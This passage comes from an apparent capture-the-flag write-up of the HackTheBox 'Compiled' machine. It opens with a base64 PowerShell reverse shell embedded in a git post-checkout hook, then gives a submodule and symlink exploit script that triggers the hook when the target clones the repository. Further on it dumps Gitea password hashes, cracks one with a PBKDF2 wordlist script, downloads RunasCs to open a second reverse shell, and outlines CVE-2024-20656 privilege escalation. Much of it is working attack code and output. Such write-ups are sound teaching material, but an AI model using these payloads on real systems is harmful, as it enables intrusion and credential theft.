JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x y/hooks/post-checkout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git add y/hooks/post-checkout</span><br><span class="line">git commit -m <span class="string">&quot;post-checkout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git push</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> http://gitea.compiled.htb:3000/kujen/repo2.git</span><br><span class="line"><span class="built_in">cd</span> repo2</span><br><span class="line">git submodule add --name x/y <span class="string">&quot;http://gitea.compiled.htb:3000/kujen/repo1.git&quot;</span> A/modules/x</span><br><span class="line">git commit -m <span class="string">&quot;add-submodule&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;.git&quot;</span> &gt; dotgit.txt</span><br><span class="line">git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;120000 %s 0\ta\n&quot;</span> <span class="string">&quot;<span class="subst">$(cat dot-git.hash)</span>&quot;</span> &gt; index.info</span><br><span class="line">git update-index --index-info &lt; index.info</span><br><span class="line">git commit -m <span class="string">&quot;add-symlink&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure></div>
+
+<p>You can put whatever you want into the pos-checkout file as your reverse shell script. I just usually use The powershell Base64 payload from revshells.com . You might do that as well :)<br>We execute this payload:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ ./exploit.sh</span><br><span class="line">Cloning into <span class="string">&#x27;repo1&#x27;</span>...</span><br><span class="line">warning: You appear to have cloned an empty repository.</span><br><span class="line">[main (root-commit) c5d01ff] post-checkout</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100755 y/hooks/post-checkout</span><br><span class="line">kUsername <span class="keyword">for</span> <span class="string">&#x27;http://gitea.compiled.htb:3000&#x27;</span>:kujen</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">&#x27;http://kujen@gitea.compiled.htb:3000&#x27;</span>:</span><br><span class="line">Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">Delta compression using up to 16 threads</span><br><span class="line">Compressing objects: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (5/5), 910 bytes | 910.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 5 (delta 0), reused 0 (delta 0), pack-reused 0</span><br><span class="line">remote: . Processing 1 references</span><br><span class="line">remote: Processed 1 references <span class="keyword">in</span> total</span><br><span class="line">To http://gitea.compiled.htb:3000/kujen/repo1.git</span><br><span class="line"> * [new branch]      main -&gt; main</span><br><span class="line">Cloning into <span class="string">&#x27;repo2&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 3, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)</span><br><span class="line">Receiving objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">Cloning into <span class="string">&#x27;/home/kujen/repo2/A/modules/x&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)</span><br><span class="line">Receiving objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">[main bf81e43] add-submodule</span><br><span class="line"> 2 files changed, 4 insertions(+)</span><br><span class="line"> create mode 100644 .gitmodules</span><br><span class="line"> create mode 160000 A/modules/x</span><br><span class="line">On branch main</span><br><span class="line">Your branch is ahead of <span class="string">&#x27;origin/main&#x27;</span> by 1 commit.</span><br><span class="line">  (use <span class="string">&quot;git push&quot;</span> to publish your <span class="built_in">local</span> commits)</span><br><span class="line"></span><br><span class="line">Untracked files:</span><br><span class="line">  (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to include <span class="keyword">in</span> what will be committed)</span><br><span class="line">        dot-git.hash</span><br><span class="line">        dotgit.txt</span><br><span class="line">        index.info</span><br><span class="line"></span><br><span class="line">nothing added to commit but untracked files present (use <span class="string">&quot;git add&quot;</span> to track)</span><br><span class="line">Username <span class="keyword">for</span> <span class="string">&#x27;http://gitea.compiled.htb:3000&#x27;</span>: kujen</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">&#x27;http://kujen@gitea.compiled.htb:3000&#x27;</span>:</span><br><span class="line">Enumerating objects: 6, <span class="keyword">done</span>.</span><br><span class="line">Counting objects: 100% (6/6), <span class="keyword">done</span>.</span><br><span class="line">Delta compression using up to 16 threads</span><br><span class="line">Compressing objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (5/5), 456 bytes | 456.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 5 (delta 0), reused 0 (delta 0), pack-reused 0</span><br><span class="line">remote: . Processing 1 references</span><br><span class="line">remote: Processed 1 references <span class="keyword">in</span> total</span><br><span class="line">To http://gitea.compiled.htb:3000/kujen/repo2.git</span><br><span class="line">   b6ea876..bf81e43  main -&gt; main</span><br></pre></td></tr></table></figure></div>
+
+<p>Later we just need to clone the second repo which will be cloned by the system and automatically executing our code. We head over to <code>http://compiled.htb:5000</code> and clone <code>http://gitea.compiled.htb:3000/kujen/repo2.git</code>, looking at our terminal we get a callback 8)</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.253.115</span>] <span class="number">54524</span></span><br><span class="line">whoami</span><br><span class="line">Richard</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Richard\source\cloned_repos\<span class="number">3</span>l6jy\.git\modules\x&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Now as we usually do, let’s head over and check for any database credentials:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\program files\Gitea\data&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\program files\Gitea\data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                actions_artifacts</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                actions_log</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                attachments</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                avatars</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">12</span>/<span class="number">13</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">14</span> PM                gitea<span class="literal">-repositories</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                home</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                indexers</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                jwt</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                lfs</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                packages</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                queues</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                repo<span class="literal">-archive</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">22</span>/<span class="number">2024</span>   <span class="number">8</span>:<span class="number">08</span> PM                repo<span class="literal">-avatars</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">25</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">40</span> PM                sessions</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">24</span>/<span class="number">2024</span>   <span class="number">5</span>:<span class="number">32</span> PM                tmp</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">12</span>/<span class="number">13</span>/<span class="number">2024</span>   <span class="number">4</span>:<span class="number">32</span> PM        <span class="number">2023424</span> gitea.db</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a <code>gitea.db</code> file, let’s transfer it over to our machine and check it out:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; <span class="keyword">select</span> * from user;</span><br><span class="line">1|administrator|administrator||administrator@compiled.htb|0|enabled|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|pbkdf2$50000<span class="variable">$50</span>|0|0|0||0|||6e1a6f3adbe7eab92978627431fd2984|a45c43d36dce3076158b19c2c696ef7b|en-US||1716401383|1716669640|1716669640|0|-1|1|1|0|0|0|1|0||administrator@compiled.htb|0|0|0|0|0|0|0|0|0||arc-green|0</span><br><span class="line">2|richard|richard||richard@compiled.htb|0|enabled|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|pbkdf2$50000<span class="variable">$50</span>|0|0|0||0|||2be54ff86f147c6cb9b55c8061d82d03|d7cf2c96277dd16d95ed5c33bb524b62|en-US||1716401466|1720089561|1720089548|0|-1|1|0|0|0|0|1|0||richard@compiled.htb|0|0|0|0|2|0|0|0|0||arc-green|0</span><br><span class="line">4|emily|emily||emily@compiled.htb|0|enabled|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000<span class="variable">$50</span>|1|0|0||0|||0056552f6f2df0015762a4419b0748de|227d873cca89103cd83a976bdac52486|||1716565398|1716567763|0|0|-1|1|0|0|0|0|1|0||emily@compiled.htb|0|0|0|0|0|0|0|2|0||arc-green|0</span><br><span class="line">6|kujen|kujen||kujen@htb.htb|0|enabled|0e484ec04d6b69b8970b7742caaf538def0c6f411c3158626ef0213981c0b66d4c94c62e333361a2006d31d28fc7cdf312cf|pbkdf2$50000<span class="variable">$50</span>|0|0|0||0|||e23da4d7e550566fa29c210202f22d6d|6b5342ba86af1a0b3615b84f849f63aa|en-US||1722107387|1722174569|1722174569|0|-1|1|0|0|0|0|1|0||kujen@htb.htb|0|0|0|0|8|0|0|0|0||arc-green|0</span><br><span class="line">sqlite&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have multiple hashes, the crackable one is EMily’s (Really lame password tho :’( )<br>For some reason I was not able to crack the hash using hashcat (mode 10900) due to its’ complexity. However, I did create my own decryptor for it (thanks chatgpt, really &lt;3):</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pbkdf2_hash</span>(<span class="params">password, salt, iterations, dklen</span>):</span><br><span class="line">    hash_value = hashlib.pbkdf2_hmac(</span><br><span class="line">    hash_name=<span class="string">&#x27;sha256&#x27;</span>, </span><br><span class="line">    password=password, </span><br><span class="line">    salt=salt, </span><br><span class="line">    iterations=iterations, </span><br><span class="line">    dklen=dklen </span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"></span><br><span class="line">salt = binascii.unhexlify(<span class="string">&#x27;227d873cca89103cd83a976bdac52486&#x27;</span>)</span><br><span class="line">dklen=<span class="number">50</span></span><br><span class="line">iterations=<span class="number">50000</span></span><br><span class="line">target_hash = <span class="string">&#x27;97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16&#x27;</span></span><br><span class="line">dictionary_file = <span class="string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span></span><br><span class="line">target_hash_bytes=binascii.unhexlify(target_hash)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(dictionary_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line"></span><br><span class="line">        password = line.strip().encode(<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">        hash_value = pbkdf2_hash(password, salt, iterations, dklen)</span><br><span class="line">        <span class="keyword">if</span> hash_value == target_hash_bytes:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Got it!!!! : <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span>      </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>This code reads passwords from rockyou.txt, hashes each password using PBKDF2 with SHA-256, a given salt, 50,000 iterations, and a derived key length of 50 bytes. It compares each hashed password to a target hash, attempting to find the matching password. If a match is found, it prints the correct password and stops further processing.<br>And yes, our password was the usual <code>12345678</code> :’(</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 decryptor.py</span><br><span class="line">Got it!!!! : b<span class="string">&#x27;12345678&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>I can now get a shell as Emily using runasCS.exe:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\program files\Gitea\data&gt; <span class="built_in">iwr</span> <span class="number">10.10</span>.x.x/RunasCs.exe <span class="literal">-outfile</span> r.exe</span><br><span class="line"><span class="built_in">PS</span> C:\program files\Gitea\data&gt; ./r.exe emily <span class="number">12345678</span> powershell.exe <span class="literal">-r</span> <span class="number">10.10</span>.x.x <span class="number">4444</span></span><br><span class="line">[-] RunasCsException: Invalid remote value: <span class="number">10.10</span>.x.x</span><br><span class="line">[-] Expected format: <span class="string">&#x27;host:port&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\program files\Gitea\data&gt; ./r.exe emily <span class="number">12345678</span> powershell.exe <span class="literal">-r</span> <span class="number">10.10</span>.x.x:<span class="number">4444</span></span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session <span class="number">0</span> with <span class="keyword">process</span> <span class="function"><span class="keyword">function</span> <span class="title">CreateProcessWithLogonW</span><span class="params">()</span></span></span><br><span class="line">[+] <span class="keyword">Using</span> Station\Desktop: Service-0x0-1ed32e3$\Default</span><br><span class="line">[+] Async <span class="keyword">process</span> <span class="string">&#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span> with pid <span class="number">1204</span> created <span class="keyword">in</span> background.</span><br><span class="line"><span class="built_in">PS</span> C:\program files\Gitea\data&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.253.115</span>] <span class="number">54568</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Try</span> the new cross<span class="literal">-platform</span> PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">compiled\emily</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+<p>And we got our user flag:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\emily\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">c894415d6de81f******************</span><br><span class="line"><span class="built_in">PS</span> C:\users\emily\desktop&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-to-NT-Authority-System-CVE-2024-20656"><a href="#Privilege-Escalation-to-NT-Authority-System-CVE-2024-20656" class="headerlink" title="Privilege Escalation to NT Authority\System - CVE-2024-20656"></a>Privilege Escalation to NT Authority\System - CVE-2024-20656</h3><p>Taking a closer look on the machine, we can see that we have Visual Studio Code installed:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\program files (x86)\Microsoft Visual Studio&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\program files (x86)\Microsoft Visual Studio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">1</span>/<span class="number">29</span>/<span class="number">2024</span>   <span class="number">9</span>:<span class="number">07</span> PM                <span class="number">2019</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">1</span>/<span class="number">20</span>/<span class="number">2024</span>   <span class="number">1</span>:<span class="number">57</span> AM                Installer</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">1</span>/<span class="number">20</span>/<span class="number">2024</span>   <span class="number">2</span>:<span class="number">04</span> AM                Shared</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>That directly gives me the thought of CVE-2024-20656 (especially since the machine avatar is also VSCode lol).<br>When Visual Studio is installed with C&#x2F;C++ support VSStandardCollectorService150 service is created and is configured to run as NT AUTHORITY\SYSTEM :</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\program files (x86)\Microsoft Visual Studio&gt; sc.exe qc VSStandardCollectorService150</span><br><span class="line">sc.exe qc VSStandardCollectorService150</span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: VSStandardCollectorService150</span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : <span class="number">3</span>   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : <span class="number">0</span>   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files (x86)\Microsoft Visual Studio\Shared\Common\DiagnosticsHub.Collection.Service\StandardCollector.Service.exe&quot;</span></span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : <span class="number">0</span></span><br><span class="line">        DISPLAY_NAME       : Visual Studio Standard Collector Service <span class="number">150</span></span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br><span class="line"><span class="built_in">PS</span> C:\program files (x86)\Microsoft Visual Studio&gt;</span><br></pre></td></tr></table></figure></div>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/" >This article <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> has a great overview over the vulnerability, steps to reproduce it and we have <a class="link"   target="_blank" rel="noopener" href="https://github.com/Wh04m1001/CVE-2024-20656/tree/main/Expl" >this amazing github repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> with a POC for the exploit, lessgo.<br>Now we can clone the project &#x3D;&gt; open it in Visual Studio alongside the C&#x2F;C++ package installed &#x3D;&gt; modify the cmd[] parameter to include the VSCode <code>VSDiagnostics.exe</code> executable path &#x3D;&gt; <code>C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe</code> &#x3D;&gt; Modify our reverse shell executable path on the <code>CopyFile</code> function line &#x3D;&gt; build the project and execute our malicious code &#x3D;&gt; BOOM.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Compiled/cve2.png"
+                      alt="CVE-2024-20656"
+                ><figcaption>CVE-2024-20656</figcaption></figure></p>
+<p>And now create a reverse shell executable using msfvenom, import all the file to the system and get our reverse shell !</p>
